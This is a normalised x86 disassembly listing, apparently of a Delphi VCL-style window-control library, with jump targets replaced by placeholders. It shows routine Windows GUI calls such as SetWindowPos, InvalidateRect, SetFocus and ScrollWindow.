xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_40358c
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44c6a8
test al al
jne r-xdata
sub_44c710
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c6a8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44c730
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c6a8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44c770
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_45dd9c
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_40358c
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44c770
test al al
jne r-xdata
sub_44c7d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c770
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44c7f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44a49c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44a460
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_448138
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44c7f4
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_44c8a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_44c7f4
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_45dd9c
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_448138
test eax eax
jne r-xdata
sub_44c94c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44b3ec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44c96c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44b3ec
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44c9a0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44b3ec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44c9c0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_44ca10
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_44ca34
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_446250
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_44a49c
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_44a460
mov dl [ esp ]
mov si 0xffd1
call sub_40358c
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_44ca8c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_40358c
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_44cab0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_40358c
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_44cae8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_448c0c
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_44a4fc
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_44ad0c
sub_44cb20
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_40358c
pop esi
pop ebx
retn
mov eax ebx
call sub_4475c8
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_4045e0
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_4045e0
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_44cba0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44b0ec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_448ce0
sub_44cc00
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_44ae60
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_44a25c
pop ebx
retn
sub_44cc30
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_44cc58
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_44daa8
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_44a25c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_44ccc8
push ebx
mov ebx eax
mov eax ebx
call sub_448b4c
mov eax ebx
call sub_44daa8
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_44a4fc
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_426e50
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_448138
sub_44cd04
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_445830
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_44d7a4
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_448138
sub_44cd44
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44daa8
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_44d7a4
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44cd84
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_44a4fc
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_44daa8
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_44d6ac
sub_44cdc4
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_44d8e4
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_44d8e4
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_44ce24
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_447b94
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_446ac8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_44b058
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_44ce94
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_448c84
mov edx esi
mov eax ebx
call sub_44a4bc
pop esi
pop ebx
retn
sub_44ceb0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_443ec0
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_45dd9c
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_40358c
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_40358c
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_40358c
test al al
jne r-xdata
sub_44cf44
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_44e8f0
mov edx esi
mov eax ebx
call sub_44ceb0
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_448138
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_448138
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_448138
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_45dd9c
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_448138
test eax eax
jne r-xdata
jmp r-xdata
sub_44d028
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_448138
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_44d07c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_448138
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_45dd9c
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_448138
test eax eax
jne r-xdata
sub_44d0c8
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_44ceb0
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_448138
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_45dd9c
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_448138
test eax eax
jne r-xdata
sub_44d124
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_45dd9c
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_448138
mov [ esi + 0xc ] eax
sub_44d158
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_44daa8
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44daa8
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_4465d8
mov eax ebx
mov si 0xffd0
call sub_40358c
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_446924
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44d230
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_44a49c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_44a460
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_40358c
inc edi
dec ebx
jne r-xdata
sub_44d278
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44a004
xor eax eax
push ebp
push sub_44d316
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44d230
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_446ba0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d31d
mov eax [ ebp - 0x4 ]
call sub_44a00c
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_44d324
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_44a49c
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_44a02c
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_44a460
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_44d414
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_41b6b0
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_41b544
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_41b6d0
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_41b654
call sub_44d7a4
jmp r-xdata
mov eax ebp
mov edx esi
call sub_41b654
call sub_44d7a4
sub_44d4ec
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_44d414
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_44d54c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_44d7a4
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_44d7a4
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
test eax eax
jne r-xdata
sub_44d5e8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44daa8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_448138
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_43a564
call sub_43a644
test al al
je r-xdata
mov eax ebx
call sub_44a49c
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_44a460
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_44a460
test [ eax + 0x52 ] 0x4
je r-xdata
sub_44d6ac
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_446924
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_44d6e4
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_45dd9c
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_44d724
push ebx
mov ebx eax
mov eax ebx
call sub_45dd9c
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_461b08
pop ebx
retn
mov eax ebx
call sub_45ddc4
mov eax ebx
call sub_44d7a4
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_44d75c
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44d780
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_44d780
sub_44d7b8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_41a018
mov eax edi
call sub_44a49c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_44a460
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_44d84c
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_44d7a4
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_44d884
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44daa8
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_44d7a4
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_40358c
sub_44d940
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_41b6b0
pop esi
pop ebx
retn
sub_44d964
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d940
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
